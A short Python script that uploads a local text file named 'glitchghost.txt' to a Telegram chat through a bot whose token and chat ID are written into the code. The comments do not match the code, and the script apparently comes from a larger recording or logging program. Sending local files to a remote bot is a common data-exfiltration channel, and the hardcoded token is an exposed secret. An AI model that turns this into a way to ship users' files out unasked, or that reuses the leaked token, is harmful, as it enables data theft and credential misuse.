import sys 
# Add the directory where 'requests' is located 
sys.path.insert(0, r'C:\\Python\\Lib\\site-packages') 
import telegram 
import asyncio 
 
# Set your Telegram bot token and chat ID 
BOT_TOKEN = '7866483331:AAFLe0iNc5VrdZkrByBrDGfr4asHeZi2O9Q' 
CHAT_ID = '2044432474' 
 
# Save to a WAV file 
output_file = "glitchghost.txt" 
 
async def send_file_to_telegram(token, chat_id, file_path): 
    bot = telegram.Bot(token=token) 
    with open(file_path, 'rb') as file: 
        await bot.send_document(chat_id=chat_id, document=file) 
    print("File sent to Telegram.") 
 
# Run the asynchronous function 
asyncio.run(send_file_to_telegram(BOT_TOKEN, CHAT_ID, output_file)) 
